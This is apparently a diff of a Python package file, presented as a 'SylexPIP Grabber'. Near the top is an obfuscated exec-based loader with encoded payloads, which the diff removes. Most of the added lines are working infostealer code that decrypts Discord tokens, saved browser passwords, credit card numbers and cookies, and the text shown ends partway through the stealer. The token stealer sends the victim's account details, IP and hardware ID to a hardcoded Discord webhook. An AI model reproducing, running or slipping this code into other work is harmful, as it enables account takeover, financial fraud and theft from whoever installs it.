c6uwk}DZOAB5AhcBNOQl;s?i7eL@#-Ro6&0CiefBNg!FuIUt>kGm_$?|;)g$zuI?h&o5mCCU~%f2(q1C1@y1i_#ED8J6rJTOv&_oK3JVH8G&Z;g>rAFZHfBMQ=}{PO{%KJmIpevcx&EvtIVAW`dqMH`&J7KEyhbN1Rv6o$;Hp!&S~+3mrL$0)uE?;Yu#L7zgTLuWa4M`4*kN9-(qw^&2r8(M{*%j~0B?5J>)R6-Ci9{C0+*?PDKjfm=b)AGEH17zXuwfb=NMzNjF->5RqF1Tb#VJGCYR4MpuD%z0d7_ihwjsl_8ffw@Iv1vGRT^td;!l#q1D?|!P#XNNJ^UOn2&{~x)cLRDI_%&R)Yj~sI5h8xA)-lNv`nQU%n`L5*+@uq44o+@WegQsczoPKX=k(_ygognDx*AQJNC{Jsnt_)4vGv6ihJk}Pgp^k3OoAL-_Hsb^otF7a(y6FfQtd;Doe*trbV6QDco$4-lgRFQbkh>-OFRw58tc@E9os4Mnmv~g;4#?;w@ZmNOwbYS$BVvQdbLd`f;7kpZ7sc(vwr&6N`y1N8-_f4{o*pD`#NeVCJI>Czv9|`ya}u9;p!tqiGul|QvC{R!?WUn*7Llg&i5=p~xv978Sgxyy+_yy3tRJun?QJ_Y$h(d9=q4r;Voh4ap$b}>;FqTcU`zs#B!0k9zKU{TR>lG79|AP)bkA<ICetbHx6vFexTm}^5l*YhYtgldj2y+FO?8WJukh`}=4&h5!~9erRPo~wsFK>dY5oOTBg3}-jZq-k6UD-73~ae&KET4(d+n52?JZ=PX<pAy4ZJ``h#wV}beBzqcH%?!!c9<$ZBJ26P+&nCLftKQYSEW1W2`=gTs?U}9eV+3Ttnea;gcj0Y-l_!z|-`6AD}l7&Y}32XZxDy9jEpzqYt<D&|0MdG?(04^4tFUMW#g7uj>wW9CVa>kl`2t&mNi`pGow%;S+CT@WhVQG2C-TljnuzPH>}%c;+>#Q<CJRb2Qgu5Kd&FBa0lBcdPB<ejg3r@KfrJu?wxoPzUL=_@sRWeVzqM7fZ^RI+zV~-aD_umrTuGHd64gP4e=pL)X3geNJ_@{CepOq5sAkW7C^|_++UAh*Ygg&}6y~!C(N`C6N)aW>Oi7!`jTgpxQ-EL@@l;R$qA;(ZPIS8H73pI1ea?d;*Km!ccB$j4=R|ah=NOkh9Dcks@(f`P&Sim!3G?silTtPqKco18B>$mzK2pOao}Bsi}Ec-?sR6oKtJ4uG;7%seWUo_Qz<hjB5Q%VNWtV4t|HL=mhL^)gIHbHIh2U$NYDeqy8pPvyP_}$+Ya1NiT8YamL#wOrR75EzD7CvumbNkL#_3YsRGiW58H6_Y?gnm|4Y4b(c|KpbIu<RD^_OUZ3~ib1R*X1lR8V_(wkf7tu*zLuV5WqRGaEC~VQiN*HP@Xr>%AU3yQl5r#OFZoPXgNeD4^JlD*(?7_v9V6i@*OE}}aN!s_F1<cTQ5nDSHKEHS~wp?>ee(=yk&IjAg9bA>8Rc|li0Kpob7&{S0(tKgOvD>uUQ3GK0>9=zzminsiItQxiVaz19(s_Mwct@f+Bq#SyQr7t6p1xt1MMG2uNNZyulE%q9P5hqW7a}*2DjaDHtL~q0Vdhv!!E8J&BRSo+LI8ZJ(?*3FjYKLuBgMk;0XqiH$HbGQQqG|oAHNTc^xH-G^eBp#lxLyKMA9^^Y4}py_W4eHm-emr!FTgA2;Et{n_6#ex%&c0fCiW3Ydk-@E1@`iZUoMWxUa$sBtN@hWI+f7#Q{^cC=<(!Wb`JMQSy`=G0FXwL{p7#yKE`j2Im+^&IZDGCcEviy|2&WgY-*1WPQMQDjd^XfZQFw^$jq$Dr05PxgG;P$?^6ANeJah5(lfp+}&sxY&xMr&+KWLn*ER6uDnFI8JN$JUFL{g%W~&nmi8m>1hSspT>W_U3ibwnW-C@A@F8kG|HLIyy<pQ<E?y&<mXfB}ETHi{2l8V86KM^f6T44xdD%!++{9%Ig1~}N^^*)@$uaby(7dpE%lWb%tw}^SwMBp}Qtv2Oa6^?3YfV|Hi3F8iFeMOue~1vIK-4*cLzf&dA1D{oMo_0)*DI{|k?-Ja1IM4rU9jc4vpxAX9g3a{%$2F-dU55H{Kz`nosZTkpnmzRrO>OTWy&Sh`T`=29og^}PsgEso#>=JVzpY96BeFs;<r6JN+SM(24V3B0sR|peCz^*g0jE+U(3vYAafE1o=1c$V%fKn7;%s8^#v^i=p|x(6oFZq!M_!h$w<mQJ=?m}`(VPg3I6m?22*n$DR7vkG+ksEhzurIFholrHR>_x!}_sE&ePp)4RFe#p?dv35xZ07UR<{ov`T$S`xK*`Z~wIf+`X1}{t$oy;?N%=6#d|(80gc?8dY;qhvAz2*6=OqKlIDwaQE>P#c5{s=fd7P5yLJgo=<M`IuFl}(UG40IaAGGFF^kNmxhiA0k7IQART5WTHm!%(DPJQKm5+&&Q#V_Wp)pnjf~GCTMX%!&2c#X&QABP(=!J(uO4PvOQRkn(}N`g5qVgt0Nb6I`P*NPFq)#F&nl@sXT@Ck=;eGOFD|dpdns%dg$~#qPn?RUmKlUx>lW0Xh2>R3j*j%I8|<nw+-~Ed;(m#A-pm@`kFqMGk#_djEg5Ty6s72&L-@?tZ%jYxwrkyl__ce*d66jUe$y3R-tJUv6f|W-e{T@;nv|FXkkk{hS9_3~D6xaKYi%9)$B&F>Jj~@)sZLRviG)<CJ3#_RkxU?)rvaIhz{NStur;>;DXZq9CP!jy)}Uf1TgMmK5VQ=nl8e9#L>Pe?C!T5_2f6|?CJoCpcaQmoX5%oP_?y)XdhN#lE@=i{O2cnZZ-SV|x#5y_EZYQ_na$Ou3?BHQfVaS^{vkc=)-xFrmfw0;;D;uDF*W}wszq8bH`VFzH^<f%n!wL;8Stp}fAW(-M^c+_TQx!6RGU?~oeYdA3(z8r$Io@v_l3jM((`f!k6I&HtS9WS?T5ZsciM_tp*CM)Tl&U9;`+KosBHR`9iS>t$rc-Uj<PNV0xF=e2Ve3#pBK6dB%95$tjOO7c-`|lm>C&(W(1fbh>gB{&@>C+GC(Z9WE^J1_ZPbH|2^LR*Y2!PQe1@ar%n544cO<Vd6<3hIXkh|6!A+@!|uxhY$Z(dW#~JX(9_uPdzmXU%vsr-PoAjkVOks`Wum3?e-yzrprR9-$RJBM{*;h|;J1gPmmR9smy&wSW7o9<VL0rcdBVpPEUPYA1S<X!Q7^Oo?cI;n!C2VUfGGpDV8~8X4SL2jhfIrPOIv|sSqf3?w0M!5%gA2<8Rt-2{>ZkzV8_X9D8=nykAWp{+GC_7!dWpVY32&;G$WpKpao<UkSr;N8bk%!Q|Ov#@}-x~USjnEM`B0aeE2N^49(C2XUT+ffUI<;q}wd<Ru-Wc#l#NAe;P6X3ski|gRwkz27`#$9TEk!Rw)Ze%h(eU=GA<k$CEO02t@&c+^~gZzlXJ9Agau!nfm5KM(*YHeza|@(-(lPE!cf{WJ!MC8Iw5;uL{cF9pkP;%wMZ-
-GSM;SgrX|@E@rKkA{fMjqv84n7DzQ0!N$L^;PlwZ>c@m+vM)7Tjuqa_qpThWQwT95-!c=kSDkS(A?Xt~<GH&Hw{W;biu*!zw+O&r&L0=ni^nxn$7?vpg0u65FeGLi{xEKGl~qe=J$%Ra3R)|0_FcZ(rkCd7wojdfx3Dg6;k=2puC4SvvM}=-ZKazrMQOiL3?kyF$GaEWcl}1CO|I7Q;x^C(s^80jhgv>aXUtnn9dI!IVJa)cAhGmz*3~0^>>iJQ#8bHK@=gTY#)k`yv181y#Gw&^D}pHPyL<B2fe{Urmp~F*$1mkKC>ByyZS-lrBfe#cd!xR`C0mrPZ)O8&*4G!K-P#N4=cXnxblV`Q7Fcf*ui5M^J{~@)D(J_;M>tlf|7<L6Jt3zo;|R|SK7k<UKuP{Y^2g}y`aLi+ri%lySlJBbzSje1E~f0a8*8*<(AJMt*K-zg=eH2446u{yAaIs{3_W~{vVu>*6H%M+X^!Rt1Fi1}1@G6gTH$~WgX;v+I#hmjHm|Rm%1HF%$HjoHpq6}(`tn0;ZdK)Pkm!s~Pmrx(BR8~{{@N1ZluE$4zf@zdoz#iO>$DJ0PD9Ub-6k9!)yfQ_L&grL^7Q!>?{Eg<OH{@){u%<TqzV=d??>A(%H6!Fcms9iv>XJ}QSv6t%ESJ$cHl(!O+#%4DG<hUKbrXzm`4|`-I1t$AbxVmrIdz)e-~cVK6dEf$W1gQ6q4U7QOs%&jxY1Gy+Ph%?Im>FX6Hj0)M1HT79Z2{(7P(N9KS>x%`xJ!T`LwCgJCc~nQSR>#-0zS+rDz}&QVRWIve<Pl4Ge-p8Khz)@r6*2>*2*H`jyRzH$cRq%a~*BECIt7jy1d7TmNNtC*ka=B?Wvyt^eC((f6PZh1j^<h<rG+|ge`(GP-XYxJ&6&0~PuTNfNCJ$-y_ski|STqgN2^Di+dAz6MlLK0%AV7S+@gipk%4-0wgq?W=pxgkNT(P|3YKL1N60Pk&N0uCd8>iLV_U&Y{gg7TTs*YN*ZWtJLsn(w;>)S`O+Ozf#~hwuX*+kUhm_CgNoCOR$d9Iv`YGs+HT%lpRQO$qR=?ygKO0J`E-bvsuFZ=O-PwnBxPcRVPh!%#NS26d$s>Ciov5#7F`doA8$CrYRTe|<?d$cJ-7Y<SYW!$=*WHKD-)Hacx~xQ1i$S@S@nonw>~K$iY5qN-)u0@vZ%uu&#}SY7Q9d;#&b?6|s3ePaw9;?rrBo9+NX@Qij|xc5IDEOd{sJh@fWEd8v3s5m@3L0qAg$WdkwKYFLeQoa)Jm>eU_4e{P3)V<!5KDhh%{bjM?o~_TYAIkV8<jsvXFY#z|Vl6p7?ZT!u3Nk3Ypkg`c(1I&GN_#^YdW{<XeM5hZ^3yK$<|<xb8|4wMJNd|q?A6196K@^Sv3H&;uzDqa#r|}%32_}C8iubIl|}c@cBpMMxw;revyal{SuQR21F`Y0jKtHYd))H&95?1+`OX4gtA0_HI=KCi8o){zDGT`f=LP0B+cD`{lq1-SSbReo07sV3yW`^R6bb)g-vFh0jG5?R*gwJEDW3~D8=)OYl?&HK?H~ZrZ>aXL7hzfv^~uEXqrqsY@kD|^q+xy-Ai;h+S)p}B<eR1hA4Wy2J3%4Lmpqg{Xn}@LfYk)idfyWlTQ6w0MAnZdx=jA^QA*A<S{vfaWywKPgKvF&${ge<;R<dODZ1s8Ekfs8u|pKPyrb`V{iRbcAsULDas7NuL+<a13e|J&CGuEz9$e4R$u$fy!b{_&Z^~~UmohwHCNkUKTR&imHT!eEJeAGQlPf!9`O_PrEEt(6ND1Abs`+%wsu8RB#5~f7u~H;FQyY?!re9^;!4E)nC@aP_4DCjc&-YLi7xjEv17X2W2ZuZ<ymMxH<o1oMx>;!g)>L2N1tDd9l$EKIJA6euWi+R|9&iLHLj?l<<|Rf$5@sF?43U$xBl^d8Xr5kNn~*99ddQEPrf9U%HR7XM={dSsAd%=%)MaYg@{$IY;u}9YawSA{5tClGpUq{hr3ul4ds+4NPQniiuPJ~c^wwT;)qFo=(Tkw$DO4$C^So^$Pj&>8=YxifcKHy_&52vE92aI%yZI9h<-c?e-ovKOOCHW%y!*(R$5#mp72mgfVVEspAgrnI2U$DqjM00bvC7Sl>Dw#m6E&6F4GAX)$p1rPv!=(84;5ohI@0!Tumn;}95!E%&Y4pBD=HEQJ}(cQl2X1muC2Vcr2x0b)qnv;5qjez>~ZcL;(Rq8nMKHuWD~Nnd#gJ0E&%'''.replace('\n','')]))
+tokens = []
+cleaned = []
+checker = []
 
-_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='979810 1451856 701556 1738286 1131928 777130 1808384 498944 2412960 956032 5915082 4357878 1155399 7076716 1096768 9607464 9704686 8048651 10662561 1351885 10886705 8237044 10331370 2165024 3365775 5799018 9212000 7813401 8233080 4307776 413344 10165379 4025860 4757856 496170 8060709 69960 5328081 7099189 6536544 7959920 2806214 277950 2559104 3012032 223936 591552 9962610 1436600 1625456 5192577 4043064 1416280 3080162 10471440 6462330 4343136 2861440 1741845 8975890 6851585 8140764 7802292 6122736 7539372 1359648 9536670 5335931 10511938 8937513 8056265 3637565 11016172 9717960 2552320 8763000 5587068 5512540 5299392 7436676 73124 10753765 8257920 1823360 9609948 4267890 564456 6065252 6855276 2748352 9834944 10534233 2795264 3236514 8647560 2677500 2522768 1586610 593434 616840 3060576 1538592 2229792 888544 595650 2166095 8397585 3274687 9948176 10319226 8029134 988668 6288620 1453785 2948200 3892980 10434410 4555166 9248990 1916577 3145315 3322534 5188572 7018320 5191305 5482508 3161360 3897952 174690 174590 5850618 2819556 3904427 2454325 9440720 9722790 10612894 2934736 1090686 1106370 8736540 964630 6486220 3989560 2202214 9069498 6645901 10245258 1684332 957682 544295 2842464 7583445 1981316 411517 194212 7295387 3013234 2510936 2828240 1167492 6193408 7805872 5476708 141792 5740225 5395508 4244946 2757725 9101568 10933439 7474074 8554518 4915482 1759329 898380 1844271 7482580 1039824 2242907 3913312 3144240 6702624 4845377 1374656 2064839 5705995 10300550 799434 9605960 8718120 1926528 1534284 2298665 414460 4306036 5724579 5008440 10100004 850660 8166980 6718020 7659663 1681362 488180 897888 756320 2823680 2456672 8309532 3951354 1671882 9611838 463904 1850592 3953815 1540586 1030624 5078241 2462680 8585512 2845632 2321235 355449 10672704 4871568 7530612 1852288 2691680 6459657 11642040 8839320 8637305 1195148 6157790 110976 6754401 10835875 3180288 4157867 10836840 795840 2778016 3047136 237664 18144 381174 4659978 1121877 9624264 2864672 986235 5340830 1642784 9477825 7475656 6378288 3466419 8494824 9749916 1930336 9773876 7674586 3866628 8029500 5434880 53218 2066016 6873517 2529885 2371328 9361876 4234930 1051952 9138354 1909910 4875025 4505490 3837832 8355225 438360 446368 1353568 2047008 2967488 10644804 4894212 7748136 703635 399743 7393907 3952600 3082911 5642000 5450960 7519200 4187848 1696630 5786256 5735665 169650 393313 3621538 3350704 1566824 2943433 7939188 4003881 967527 561064 990896 7872992 2789992 9179304 2780328 7594255 3794678 11010256 6994920 858864 2798948 2737895 5301632 4816300 2089555 9550224 8589846 8282736 710704 669460 1008320 4040180 4468458 4526055 3835186 3264666 1978960 11074200 9351688 2573086 423030 8277360 4632789 3426248 8649396 1341102 8535879 693289 70924 2222352 1938440 6407820 2503992 1014875 64400 4158814 6867432 11765640 7300228 896852 19830 396530 776928 1859904 1439168 67424 7429485 4829190 2985568 10064246 2184600 2413040 11045328 596428 793637 2391017 4416766 3764460 7478286 3906981 3338151 4907438 956510 1275136 83360 189056 859712 1119680 2407648 1855712 1930560 3580398 4905469 1308763 8720493 958750 2926374 703640 8119664 2026297 873341 410140 1330848 2057856 1774592 3048704 8564194 2723652 9627975 5140800 356544 8023440 8511960 1907960 8897280 1348550 2127408 4270610 2250839 5447652 4603434 8320689 4657918 1042434 877720 2696992 2977088 183296 458144 2275808 1242208 3007648 1647168 1716726 4057473 5110029 9255513 9648978 3760028 287880 1350832 576600 2926908 369780 135296 1752416 1471232 875008 417270 5899068 1957344 2283105 10560840 2661960 5444880 471852 155062 4971561 1012478 3930990 231442 192024 2492510 9757105 4498654 382150 671456 52192 192128 1092704 1805248 1929824 3051008 1404544 5733063 8413230 310532 4281784 47008 9891543 469728 6724580 7874240 123880 10211310 9466528 3691092 1031920 4662784 1366698 2876068 684728 1890876 5409383 87924 3339696 1271776 7161413 10515830 1596832 1374105 1571104 8689434 1980668 982940 695172 1856190 4762496 9664185 1719160 3392730 7284220 4214010 2232560 1050090 4511592 2763072 128617 414570 2823840 562016 3152448 2986944 9496020 617040 5896582 230571 3810280 10790754 11111184 4286945 10453520 94200 4224528 1214400 969445 1756234 1314192 9029097 3589970 7198400 915720 3425796 2037495 774890 1417344 1112032 2954944 2494880 751210 6317954 8358360 3763386 2488337 10677968 7769448 1700038 452600 1426976 2920480 1503808 1830496 4385723 11152920 2126353 4189185 1188120 3739320 8386524 3130596 56230 777830';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzLPfLigoMM47KDct2CvQwdXQPynEMrDAGAGNCB8A=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
+def decrypt(buff, master_key):
+    try:
+        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
+    except:
+        return "Error"
+def getip():
+    ip = "None"
+    try:
+        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+    except: pass
+    return ip
+def gethwid():
+    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+def get_token():
+    already_check = []
+    checker = []
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
+    chrome = local + "\\Google\\Chrome\\User Data"
+    paths = {
+        'Discord': roaming + '\\discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Lightcord': roaming + '\\Lightcord',
+        'Discord PTB': roaming + '\\discordptb',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
+        'Amigo': local + '\\Amigo\\User Data',
+        'Torch': local + '\\Torch\\User Data',
+        'Kometa': local + '\\Kometa\\User Data',
+        'Orbitum': local + '\\Orbitum\\User Data',
+        'CentBrowser': local + '\\CentBrowser\\User Data',
+        '7Star': local + '\\7Star\\7Star\\User Data',
+        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
+        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
+        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
+        'Chrome': chrome + 'Default',
+        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
+        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
+        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Iridium': local + '\\Iridium\\User Data\\Default'
+    }
+    for platform, path in paths.items():
+        if not os.path.exists(path): continue
+        try:
+            with open(path + f"\\Local State", "r") as file:
+                key = loads(file.read())['os_crypt']['encrypted_key']
+                file.close()
+        except: continue
+        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
+            if not file.endswith(".ldb") and file.endswith(".log"): continue
+            else:
+                try:
+                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
+                        for x in files.readlines():
+                            x.strip()
+                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
+                                tokens.append(values)
+                except PermissionError: continue
+        for i in tokens:
+            if i.endswith("\\"):
+                i.replace("\\", "")
+            elif i not in cleaned:
+                cleaned.append(i)
+        for token in cleaned:
+            try:
+                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
+            except IndexError == "Error": continue
+            checker.append(tok)
+            for value in checker:
+                if value not in already_check:
+                    already_check.append(value)
+                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
+                    try:
+                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
+                    except: continue
+                    if res.status_code == 200:
+                        res_json = res.json()
+                        ip = getip()
+                        pc_username = os.getenv("UserName")
+                        pc_name = os.getenv("COMPUTERNAME")
+                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
+                        user_id = res_json['id']
+                        email = res_json['email']
+                        phone = res_json['phone']
+                        mfa_enabled = res_json['mfa_enabled']
+                        has_nitro = False
+                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
+                        nitro_data = res.json()
+                        has_nitro = bool(len(nitro_data) > 0)
+                        days_left = 0
+                        if has_nitro:
+                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                            days_left = abs((d2 - d1).days)
+                        embed = f"""**{user_name}** *({user_id})*\n
+> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
+> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
+> :piñata: __Token__\n\t`{tok}`\n
+*Made by SylexSquad* **|** ||https://github.com/sylexsquad||"""
+                        payload = json.dumps({'content': embed, 'username': 'SylexPIP Grabber - Made by SylexSquad', 'avatar_url': 'https://cdn.discordapp.com/attachments/1055087022072680450/1086413304089550939/sylexsquad-2.png'})
+                        try:
+                            headers2 = {
+                                'Content-Type': 'application/json',
+                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+                            }
+                            req = Request('https://discord.com/api/webhooks/1086610661099962489/vCddv62w1pd5dl3bSTFFhHq2U_NY_kW_quQWUKn_R2gM9m1g8gu1H0MUH7MZnLJa-VAU', data=payload.encode(), headers=headers2)
+                            urlopen(req)
+                        except: continue
+                else: continue
+if __name__ == '__main__':
+    get_token()
+
+
+
+
+import os, requests, json, base64, sqlite3, shutil
+from win32crypt import CryptUnprotectData
+from Crypto.Cipher import AES
+from datetime import datetime
+
+hook = "https://discord.com/api/webhooks/1086610661099962489/vCddv62w1pd5dl3bSTFFhHq2U_NY_kW_quQWUKn_R2gM9m1g8gu1H0MUH7MZnLJa-VAU"
+
+appdata = os.getenv('LOCALAPPDATA')
+user = os.path.expanduser("~")
+
+browsers = {
+    'amigo': appdata + '\\Amigo\\User Data',
+    'torch': appdata + '\\Torch\\User Data',
+    'kometa': appdata + '\\Kometa\\User Data',
+    'orbitum': appdata + '\\Orbitum\\User Data',
+    'cent-browser': appdata + '\\CentBrowser\\User Data',
+    '7star': appdata + '\\7Star\\7Star\\User Data',
+    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
+    'vivaldi': appdata + '\\Vivaldi\\User Data',
+    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
+    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
+    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
+    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
+    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
+    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
+    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
+    'iridium': appdata + '\\Iridium\\User Data',
+}
+
+
+def get_master_key(path: str):
+    if not os.path.exists(path):
+        return
+
+    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
+        return
+
+    with open(path + "\\Local State", "r", encoding="utf-8") as f:
+        c = f.read()
+    local_state = json.loads(c)
+
+    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    master_key = master_key[5:]
+    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+    return master_key
+
+
+def decrypt_password(buff: bytes, master_key: bytes) -> str:
+    iv = buff[3:15]
+    payload = buff[15:]
+    cipher = AES.new(master_key, AES.MODE_GCM, iv)
+    decrypted_pass = cipher.decrypt(payload)
+    decrypted_pass = decrypted_pass[:-16].decode()
+
+    return decrypted_pass
+
+
+def save_results(browser_name, data_type, content):
+    if not os.path.exists(user+'\\AppData\\Local\\Temp\\Browser'):
+        os.mkdir(user+'\\AppData\\Local\\Temp\\Browser')
+    if not os.path.exists(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}'):
+        os.mkdir(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}')
+    if content is not None:
+        open(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}\\{data_type}.txt', 'w', encoding="utf-8").write(content)
+
+def get_login_data(path: str, profile: str, master_key):
+    login_db = f'{path}\\{profile}\\Login Data'
+    if not os.path.exists(login_db):
+        return
+    result = ""
+    shutil.copy(login_db, user+'\\AppData\\Local\\Temp\\login_db')
+    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\login_db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+    for row in cursor.fetchall():
+        password = decrypt_password(row[2], master_key)
+        result += f"""
+        URL: {row[0]}
+        Email: {row[1]}
+        Password: {password}
+        
+        """
+    conn.close()
+    os.remove(user+'\\AppData\\Local\\Temp\\login_db')
+    return result
+
+
+def get_credit_cards(path: str, profile: str, master_key):
+    cards_db = f'{path}\\{profile}\\Web Data'
+    if not os.path.exists(cards_db):
+        return
+
+    result = ""
+    shutil.copy(cards_db, user+'\\AppData\\Local\\Temp\\cards_db')
+    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\cards_db')
+    cursor = conn.cursor()
+    cursor.execute(
+        'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
+    for row in cursor.fetchall():
+        if not row[0] or not row[1] or not row[2] or not row[3]:
+            continue
+
+        card_number = decrypt_password(row[3], master_key)
+        result += f"""
+        Name Card: {row[0]}
+        Card Number: {card_number}
+        Expires:  {row[1]} / {row[2]}
+        Added: {datetime.fromtimestamp(row[4])}
+        
+        """
+
+    conn.close()
+    os.remove(user+'\\AppData\\Local\\Temp\\cards_db')
+    return result
+
+
+def get_cookies(path: str, profile: str, master_key):
+    cookie_db = f'{path}\\{profile}\\Network\\Cookies'
+    if not os.path.exists(cookie_db):
+        return
+    result = ""
+    shutil.copy(cookie_db, user+'\\AppData\\Local\\Temp\\cookie_db')
+    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\cookie_db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
+    for row in cursor.fetchall():
+        if not row[0] or not row[1] or not row[2] or not row[3]:
+            continue
+
+        cookie = decrypt_password(row[3], master_key)
+
+        result += f"""
+        Host Key : {row[0]}
+        Cookie Name : {row[1]}
+        Path: {row[2]}
+        Cookie: {cookie}
+        Expires On: {row[4]}
+        
+        """
+
+    conn.close()
+    os.remove(user+'\\AppData\\Local\\Temp\\cookie_db')
+    return result
+
+
+def get_web_history(path: str, profile: str):
+    web_history_db = f'{path}\\{profile}\\History'
+    result = ""
+    if not os.path.exists(web_history_db):
+        return
+
+    shutil.copy(web_history_db, user+'\\AppData\\Local\\Temp\\web_history_db')
+    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\web_history_db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT url, title, last_visit_time FROM urls')
+    for row in cursor.fetchall():
+        if not row[0] or not row[1] or not row[2]:
+            continue
+        result += f"""
+        URL: {row[0]}
+        Title: {row[1]}
+        Visited Time: {row[2]}
+        
+        """
+    conn.close()
+    os.remove(user+'\\AppData\\Local\\Temp\\web_history_db')
+    return result
+
+
+def get_downloads(path: str, profile: str):
+    downloads_db = f'{path}\\{profile}\\History'
+    if not os.path.exists(downloads_db):
+        return
+    result = ""
+    shutil.copy(downloads_db, user+'\\AppData\\Local\\Temp\\downloads_db')
